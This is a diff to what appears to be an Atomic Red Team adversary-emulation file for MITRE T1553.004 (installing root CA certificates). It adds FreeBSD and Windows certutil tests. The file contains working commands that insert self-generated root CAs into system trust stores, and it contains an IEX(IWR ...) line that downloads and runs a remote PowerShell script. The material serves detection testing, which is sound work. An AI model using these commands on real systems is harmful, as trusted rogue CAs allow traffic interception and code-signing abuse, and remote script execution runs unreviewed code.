@@ -1,5 +1,5 @@
 attack_technique: T1553.004
-display_name: 'Subvert Trust Controls: Install Root Certificate'
+display_name: "Subvert Trust Controls: Install Root Certificate"
 atomic_tests:
 - name: Install root CA on CentOS/RHEL
   auto_generated_guid: 9c096ec4-fd42-419d-a762-d64cc950627e
@@ -10,11 +10,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: Path of the CA certificate we create
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   executor:
     command: |
@@ -27,6 +27,32 @@ atomic_tests:
       update-ca-trust
     name: sh
     elevation_required: true
+- name: Install root CA on FreeBSD
+  auto_generated_guid: f4568003-1438-44ab-a234-b3252ea7e7a3
+  description: |
+    Creates a root CA with openssl
+  supported_platforms:
+  - linux
+  input_arguments:
+    cert_filename:
+      description: Path of the CA certificate we create
+      type: path
+      default: rootCA.crt
+    key_filename:
+      description: Key we create that is used to create the CA certificate
+      type: path
+      default: rootCA.key
+  executor:
+    command: |
+      openssl genrsa -out #{key_filename} 4096
+      openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+      cp #{cert_filename} /usr/local/share/certs/
+      certctl rehash
+    cleanup_command: |
+      rm /usr/local/share/certs/#{cert_filename}
+      certctl rehash
+    name: sh
+    elevation_required: true
 - name: Install root CA on Debian/Ubuntu
   auto_generated_guid: 53bcf8a0-1549-4b85-b919-010c56d724ff
   description: |
@@ -36,11 +62,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: CA file name
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   dependency_executor_name: sh
   dependencies:
@@ -54,7 +80,7 @@ atomic_tests:
   executor:
     command: |
       mv #{cert_filename} /usr/local/share/ca-certificates
-      echo sudo update-ca-certificates
+      sudo update-ca-certificates
     name: sh
     elevation_required: true
 - name: Install root CA on macOS
@@ -66,11 +92,11 @@ atomic_tests:
   input_arguments:
     cert_filename:
       description: CA file name
-      type: Path
+      type: path
       default: rootCA.crt
     key_filename:
       description: Key we create that is used to create the CA certificate
-      type: Path
+      type: path
       default: rootCA.key
   dependency_executor_name: sh
   dependencies:
@@ -95,7 +121,7 @@ atomic_tests:
   input_arguments:
     pfx_path:
       description: Path of the certificate
-      type: Path
+      type: path
       default: rootCA.cer
   dependency_executor_name: powershell
   dependencies:
@@ -123,32 +149,48 @@ atomic_tests:
 - name: Install root CA on Windows with certutil
   auto_generated_guid: 5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f
   description: |
-    Creates a root CA with certutil
+    Installs a root CA certificate into the machine-wide Trusted Root Certification
+    Authorities store using certutil -f -addstore root.
   supported_platforms:
   - windows
   input_arguments:
-    pfx_path:
-      description: Path of the certificate
-      type: Path
-      default: $env:Temp\rootCA2.cer
+    root_cert_path:
+      description: Path to the root CA certificate file
+      type: path
+      default: $env:TEMP\atomic_rootCA.cer
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Certificate must exist at specified location (#{pfx_path})
+      Root CA certificate must be generated
     prereq_command: |
-      if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+      if (Test-Path "#{root_cert_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
-      Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
-      Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+      $root = New-SelfSignedCertificate -Subject "CN=Atomic Root CA" -CertStoreLocation Cert:\CurrentUser\My -KeyUsage CertSign -TextExtension @("2.5.29.19={critical}{text}ca=TRUE")
+      Export-Certificate -Cert $root -FilePath "#{root_cert_path}" -Type CERT
+      $root.Thumbprint | Out-File "$env:TEMP\T1553.004_rootCA_thumbprint.txt"
+      Remove-Item "Cert:\CurrentUser\My\$($root.Thumbprint)"
   executor:
     command: |
-      certutil -addstore my #{pfx_path}
+      certutil.exe -f -addstore root "#{root_cert_path}"
     cleanup_command: |
-      try {
-      $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
-      Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
-      Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
-      } catch { }
+      $rootThumb = Get-Content "$env:TEMP\T1553.004_rootCA_thumbprint.txt" -ErrorAction SilentlyContinue
+      if ($rootThumb) { Get-ChildItem "Cert:\LocalMachine\Root\$rootThumb" -ErrorAction SilentlyContinue | Remove-Item }
+      Remove-Item "#{root_cert_path}" -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\T1553.004_rootCA_thumbprint.txt" -ErrorAction SilentlyContinue
+    name: powershell
+    elevation_required: true
+- name: Add Root Certificate to CurrentUser Certificate Store
+  auto_generated_guid: ca20a3f1-42b5-4e21-ad3f-1049199ec2e0
+  description: |
+    The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
+    Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
+    Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+    cleanup_command: |
+      Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
     name: powershell
     elevation_required: true
